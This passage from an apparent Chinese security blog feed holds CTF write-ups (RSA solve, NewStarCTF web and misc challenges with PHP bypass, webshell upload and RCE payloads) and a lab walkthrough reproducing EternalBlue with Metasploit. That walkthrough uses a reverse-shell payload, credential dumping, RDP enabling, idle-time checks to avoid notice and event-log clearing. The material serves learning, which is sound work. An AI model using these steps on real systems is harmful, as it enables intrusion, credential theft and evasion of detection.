&#x3D;  4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>已知<code>p</code>、<code>q</code>、<code>e</code>、<code>c</code>，而本题的考点就是欧拉函数的运用</p><p>所以我们可以构造</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">q &#x3D;  115478867870347527660680329271012852043845868401928361076102779938370270670897498759391844282137149013845956612257534640259997979275610235395706473965973203544920469416283181677660262509481282536465796731401967694683575843183509430017972506752901270887444490905891490955975762524187534052478173966117471143713p &#x3D;  171790960371317244087615913047696670778115765201883835525456016207966048658582417842936925149582378305610304505530997833147251832289276125084339614808085356814202236463900384335878760177630501950384919794386619363394169016560485152083893183420911295712446925318391793822371390439655160077212739260871923935217c &#x3D;  4459183928324369762397671605317600157512712503694330767938490496225669985050002776253470841193156951087663107866714426230222002399666306287642591077990897883174134404896800482234781531592939043551832049756571987010173667074168282355520711905659013076509353523088583347373358980842707686611157050425584598825151399870268083867269912139634929397957514376826145870752116583185351576051776627208882377413433140577461314504762388617595282085102271510792305560608934353515552201553674287954987323321512852114353266359364282603487098916608302944694600227628787791876600901537888110093703612414836676571562487005330299996908873589228072982641114844761980143047920770114535924959765518365614709272297666231481655857243004072049094078525569460293381479558148506346966064906164209362147313371962567040047084516510135054571080612077333228195608109065475260832580192321853906138811139036658485688320161530131239854003996457871663456850196483520239675981391047452381998620386899101820782421605287708727667663038905378115235163773867508258208867367314108701855709002634592329976912239956212490788262396106230191754680813790425433763427315230330459349320412354189010684525105318610102936715203529222491642807382215023468936755584632849348996666528981269240867612068382243822300418856599418223875522408986596925018975565057696218423036459144392625166761522424721268971676010427096379610266649911939139451989246194525553533699831110568146220347603627745407449761792135898110139743498767543521297525802809254842518002190381508964357001211353997061417710783337e &#x3D; 65537phi &#x3D; (p**3 - p**2)*(q**2 - q)d &#x3D; primefac.modinv(e, phi)n &#x3D; p**3*q**2m &#x3D; pow(c,d,n)print(long_to_bytes(m))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202403212111844.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB、学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023NewStarCTF-Week1-WP</title>
      <link href="/2023/10/08/2023NewStarCTF-Week1-%E9%83%A8%E5%88%86WP/"/>
      <url>/2023/10/08/2023NewStarCTF-Week1-%E9%83%A8%E5%88%86WP/</url>
      
        <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h3><p>本题就是MISC的签到题，打开后是一串base编码，</p><blockquote><p>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA&#x3D;</p></blockquote><p>放入随波逐流中解密</p><p>该代码经历了base32-base58-base64 然后得到正确flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081906714.png"></p><h3 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h3><p>本题打开是一张二维码图片，先用CQR扫描看看里面有什么</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081916262.png"></p><p>说明考点并不在这，用010打开也没有得到有效信息，那就用StegSolve打开图片，在Data Extract将RGB都调到最低，得到flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081921280.png"></p><h3 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h3><p>打开后得到一个pcapng文件，里面很多http请求，将其通过WireShark导出</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081932502.png"></p><p>发现可疑包</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081934421.png"></p><p>追踪HTTP流发现里面有一串base代码</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081935327.png"></p><p>放入随波逐流base64解密俩次得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081936508.png"></p><h3 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h3><p>打开得到一个空白文件，通过010打开发现其是一个压缩包文件且文件头错误，将文件头修改</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081938198.png"></p><p>得到的压缩包里面包含着一个压缩包，解压后发现里面的txt文件需要密码才能打开，且有一段base代码的注释，解密后得到提示</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081940657.png"></p><p>说明可以通过爆破来得到txt文件里面的flag，通过Ziperello进行爆破，得到密码</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081944309.png"></p><p>打开txt文件得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081945006.png"></p><h3 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h3><p>打开后就是一面空白，且通过Ctrl+A全选发现其没有规则，不考虑考morse的可能，</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081948411.png"></p><p>经过上网搜索学习，发现其考点为Whitespace语言，解密后得到flag</p><p>解密网站<a href="https://www.w3cschool.cn/tryrun/runcode?lang=whitespace">whitespace在线运行,在线工具，在线编译IDE_w3cschool</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081949793.png"></p><h3 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h3><p>根据题目与所给图片提示，可知是SilentEye隐写，利用SilentEye工具Decode俩次得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081953334.png"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>打开网站提示管理员泄露俩个敏感信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081955208.png"></p><p>通过python脚本尝试一下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">import requestsif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    # url为被扫描地址，后不加‘&#x2F;’    url1 &#x3D; &#39;http:&#x2F;&#x2F;4b6a43da-9744-47e0-b78d-7c4889a38fc2.node4.buuoj.cn:81&#x2F;&#39;    # 常见的网站源码备份文件名    list1 &#x3D; [&#39;web&#39;, &#39;website&#39;, &#39;backup&#39;, &#39;back&#39;, &#39;www&#39;, &#39;wwwroot&#39;, &#39;temp&#39;]    # 常见的网站源码备份文件后缀    list2 &#x3D; [&#39;tar&#39;, &#39;tar.gz&#39;, &#39;zip&#39;, &#39;rar&#39;]    for i in list1:        for j in list2:            back &#x3D; str(i) + &#39;.&#39; + str(j)            url &#x3D; str(url1) + &#39;&#x2F;&#39; + back            print(back + &#39;    &#39;, end&#x3D;&#39;&#39;)            print(requests.get(url).status_code)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现<a href="http://www.zip可以访问成功,/">www.zip可以访问成功，</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081956429.png"></p><p>下载后得到俩个敏感信息</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081957368.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310081957461.png"></p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p>如题目所述，一个简单的上传题，无法直接上传php文件，所以先上传一个写有一句话木马的jpg图片类型的文件并通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082001955.png"></p><p>将其后缀修改为.php再发送</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082002387.png"></p><p>然后通过蚁剑连接从根目录下得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082003013.png"></p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><h4 id="第一步-Get传参"><a href="#第一步-Get传参" class="headerlink" title="第一步 Get传参"></a>第一步 Get传参</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082004890.png"></p><h4 id="第二步-POST传参"><a href="#第二步-POST传参" class="headerlink" title="第二步 POST传参"></a>第二步 POST传参</h4><p>secret被藏在调试器中</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082006530.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082006519.png"></p><p>POST传参后进入下一步并抓包</p><h4 id="第三步-修改COOKIE"><a href="#第三步-修改COOKIE" class="headerlink" title="第三步 修改COOKIE"></a>第三步 修改COOKIE</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082007404.png"></p><p>此时我们的power为hacker，将其修改为ctfer即可进入下一步</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082008737.png"></p><h4 id="第四步-浏览器修改"><a href="#第四步-浏览器修改" class="headerlink" title="第四步 浏览器修改"></a>第四步 浏览器修改</h4><p>即将User-Agent内容修改为NewStarCTF2023即可进入下一步</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082009487.png"></p><h4 id="第五步-增加访问所需网站"><a href="#第五步-增加访问所需网站" class="headerlink" title="第五步 增加访问所需网站"></a>第五步 增加访问所需网站</h4><p>即将Referer中的内容修改为newstarctf.com即可进入下一步</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082011914.png"></p><h4 id="第六步-Fake-IP"><a href="#第六步-Fake-IP" class="headerlink" title="第六步 Fake IP"></a>第六步 Fake IP</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082011184.png"></p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>看到flask我想到了ssti注入，通过ssti注入得到flag</p><p>即<strong>url+?number1&#x3D;1&amp;number2&#x3D;2</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082013926.png"></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><h4 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082014538.png"></p><p>很简单的MD5弱类型比较</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708 </p></blockquote><h4 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082016322.png"></p><p>第二关可以通过数组绕过，php哈希函数的特性，当处理数组类型的传参时其会返回null，则就形成了null&#x3D;null满足了强等于的条件</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708 </p><p>POST：key3[]&#x3D;1</p></blockquote><h4 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082018232.png"></p><p>strcmp函数特性，当传入的参数为数组时即返回null，即传入key4为数组，则返回null，null&#x3D;0符合其条件</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1</p><p>POST：key3[]&#x3D;1</p></blockquote><h4 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082020738.png"></p><p>通过is_numeric()函数使传入的key5不能为纯数字且必须大于2023，则可以通过在2024后加字母来进行绕过</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1&amp;key5&#x3D;2024a</p><p>POST：key3[]&#x3D;1</p></blockquote><h4 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h4><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082021897.png"></p><p>上面的正则表达式过滤了大小写字母和数字，而extract所导致的可以使本题也可以通过数组进行绕过</p><blockquote><p>构造Payload url+?key1&#x3D;QNKCDZO&amp;key2&#x3D;240610708&amp;key4[]&#x3D;1&amp;key5&#x3D;2024a</p><p>POST：key3[]&#x3D;1&amp;flag5[]&#x3D;1</p></blockquote><p>得到flag</p><p><img src="http://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310082026497.png"></p><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231514818.png"></p><p>首先打开本题环境可以看到上述php代码</p><p>需要我们先找到一个$password进行MD5加密后前六个值为“c4d038”，然后在输入一个可执行的$code能够避开所过滤的值，从而得到flag</p><p>我们可以通过MD5碰撞得到为我们需要的$password，其值为 ： <strong>“114514”</strong></p><p>然后会发现无论我们怎么去输入$code，只要传参为<strong>e_v.a.l</strong>都无法使其执行成功，这是，这是因为在php中，空格和点无论是get或post传参都无法正常转换</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231521007.png"></p><p>所以为了防止其被过滤，我们可以通过修改_来解决，这也是利用php版本问题</p><blockquote><p>当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>，也就是说如果中括号<code>[</code>出现在前面，那么中括号<code>[</code>还是会被转换成下划线<code>_</code>，但是因为出错导致接下来的非法字符并不会被转换成下划线<code>_</code></p></blockquote><p><strong>这就说明，如果我们将’-‘修改为’[‘，则后续的俩个.不会被更改为’-‘,而[也会被正常转换为’_’</strong></p><p>所以我们构造如下的$code</p><blockquote><p>payload: POST: password&#x3D;114514&amp;e[v.a.l&#x3D;echo <code>tac /f*</code>;</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231529514.png"></p><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>本题打开为一登录网站，如果登录进去后就是一个类似于chatgpt的东西，考虑其应该从登录页面下手，发现其为弱密码爆破，通过BP抓包</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231535100.png"></p><p>通过BP抓包发现其密码也被MD5加密过</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231537883.png"></p><p>通过弱密码爆破，发现其密码为000000，这里图省事直接输入爆破了</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231538036.png"></p><p>通过代理中的HTTP历史记录，可以发现一个302跳转，点击进去发现里面有着flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202310231544781.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 基础、新手、WEB学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝复现(附带win7虚拟机安装教程)</title>
      <link href="/2023/08/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0-%E9%99%84%E5%B8%A6win7%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2023/08/11/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0-%E9%99%84%E5%B8%A6win7%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="Win7虚拟机安装"><a href="#Win7虚拟机安装" class="headerlink" title="Win7虚拟机安装"></a>Win7虚拟机安装</h3><p>首先进入该网站  <a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112029452.png"></p><p>下载一个win7 iso镜像，然后打开Vmware</p><p><strong>第一步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112030084.png"></p><p><strong>第二步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112033933.png"></p><p><strong>第三步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112033763.png"></p><p><strong>第四步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112034601.png"></p><p><strong>第五步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112034620.png"></p><p><strong>第六步、选择BIOS</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112035984.png"></p><p><strong>第七步、选择处理器数量</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112038769.png"></p><p><strong>第八步、选择内存大小</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112036106.png"></p><p><strong>第九步、选择桥接网络</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112038948.png"></p><p><strong>第十步、按推荐来就行</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112039895.png"></p><p><strong>第十一步、按推荐来就行</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112040219.png"></p><p><strong>第十二步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112041703.png"></p><p><strong>第十三步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112041787.png"></p><p><strong>第十四步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112042955.png"></p><p>然后完成即可</p><p><strong>第十五步、在CD&#x2F;DVD中选择镜像文件</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112044247.png"></p><p>然后开机</p><p><strong>第十六步、下一步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112045752.png"></p><p>下一步后直接现在安装</p><p><strong>第十七步、选择接受和下一步</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112047671.png"></p><p><strong>第十八步、选择自定义(高级)</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112047900.png"></p><p><strong>第十九步、下一步即可</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112049363.png"></p><p><strong>第二十步、取个用户名</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112056351.png"></p><p><strong>第二十一步、设置密码</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112057736.png"></p><p><strong>第二十二步、直接下一步就行</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112058488.png"></p><p><strong>第二十三步、使用推荐设置</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112059842.png"></p><p>后面跟随系统指引即可</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112100185.png"></p><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><blockquote><p>攻击机：kali</p><p>ip地址：192.168.1.17</p></blockquote><blockquote><p>被攻击机：window 7</p><p>ip地址：192.168.1.18</p></blockquote><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一、先测试能否相互ping通</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141617217.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112111556.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308112111583.png"></p><p>二、在kali上用nmap扫描局域网内主机</p><pre class="line-numbers language-none"><code class="language-none">nmap -sP 192.168.1.1&#x2F;24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现被攻击机</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141618780.png"></p><p>三、扫描端口查看其运行的服务</p><pre class="line-numbers language-none"><code class="language-none">nmap -p 1-65535 -A 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141620919.png"></p><pre class="line-numbers language-none"><code class="language-none">masscan --rate&#x3D;10000 -p1-65535 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141616556.png"></p><p>发现445端口  正是永恒之蓝利用的便是445端口中的SMB服务获取系统的最高权限</p><p>四、进行漏洞扫描</p><pre class="line-numbers language-none"><code class="language-none">nmap --script&#x3D;vuln 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141625140.png"></p><p>扫描的漏洞中包括<strong>MS17-010漏洞</strong></p><p>五、进入MSF控制台</p><pre class="line-numbers language-none"><code class="language-none">msfconsole<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>寻找我们刚才扫描到的 <strong>MS17-010漏洞</strong></p><pre class="line-numbers language-none"><code class="language-none">search ms17-010<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141628161.png"></p><p>在其中</p><p>3代表着永恒之蓝扫描模块,探测主机是否存在永恒之蓝的漏洞</p><p>0代表着永恒之蓝攻击模块，用于攻击目标用户，</p><p>数字需要自己判断你自己的攻击模块在哪，每个人都不一样</p><p>加载扫描模块</p><pre class="line-numbers language-none"><code class="language-none">use 3   use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010       &#x2F;&#x2F;俩者皆可，输入一个就行show options    &#x2F;&#x2F;查看该模块所需的参数配置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141633575.png"></p><p>发现其RHOSTS尚未配置</p><p>设置攻击目标的ip</p><pre class="line-numbers language-none"><code class="language-none">set rhosts 192.168.1.18设置后执行扫描run           &#x2F;&#x2F;进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141635700.png"></p><p>说明可以进行攻击，但是我们上面其实已经扫过该目标靶机里面有永恒之蓝漏洞</p><p>六、使用攻击模块</p><pre class="line-numbers language-none"><code class="language-none">use 0    use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue    &#x2F;&#x2F;使用一个即可show options    set rhosts 192.168.1.18   &#x2F;&#x2F;设置目标主机ipset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;设置payloadset lhost 192.168.1.17   &#x2F;&#x2F;设置攻击机ip run  或  exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141644517.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141646012.png"></p><p>运行成功会出现meterpreter控制台，并在结尾处出现 WIN  这时候我们就已经拿到权限并且可以使用</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141649007.png"></p><h3 id="演示功能"><a href="#演示功能" class="headerlink" title="演示功能"></a>演示功能</h3><h4 id="一、屏幕截取"><a href="#一、屏幕截取" class="headerlink" title="一、屏幕截取"></a>一、屏幕截取</h4><pre class="line-numbers language-none"><code class="language-none">screenshot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141654891.png"></p><h4 id="二、上传-x2F-下载文件"><a href="#二、上传-x2F-下载文件" class="headerlink" title="二、上传&#x2F;下载文件"></a>二、上传&#x2F;下载文件</h4><p>上传文件</p><pre class="line-numbers language-none"><code class="language-none">upload 1.txt c:&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141656746.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141657662.png"></p><p>下载文件</p><pre class="line-numbers language-none"><code class="language-none">download c:&#x2F;&#x2F;2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141706192.png"></p><h4 id="三、获取CMD"><a href="#三、获取CMD" class="headerlink" title="三、获取CMD"></a>三、获取CMD</h4><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141712539.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141713076.png"></p><h4 id="四、获取用户密码"><a href="#四、获取用户密码" class="headerlink" title="四、获取用户密码"></a>四、获取用户密码</h4><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141715113.png"></p><pre class="line-numbers language-none"><code class="language-none">creds_all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141716805.png"></p><p>启用远程桌面</p><pre class="line-numbers language-none"><code class="language-none">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141717749.png"></p><p>查看用户空闲时间，以防将其顶掉被发现</p><pre class="line-numbers language-none"><code class="language-none">idletime<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后调到kali的管理员终端</p><pre class="line-numbers language-none"><code class="language-none">rdesktop 192.168.1.18<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141725948.png"></p><p>原账户被顶掉，当然也可以利用自己提权然后自己新创一个用户登录</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141724467.png"></p><h4 id="五、清理日志"><a href="#五、清理日志" class="headerlink" title="五、清理日志"></a>五、清理日志</h4><p>清理前</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141729848.png"></p><p>清理后</p><pre class="line-numbers language-none"><code class="language-none">clearev        &#x2F;&#x2F;在meterpreter上<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202308141730360.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上就是我对永恒之蓝的复现</p><p>参考链接：<a href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue永恒之蓝）漏洞利用+修复方法_RDrug的博客-CSDN博客</a></p><p><a 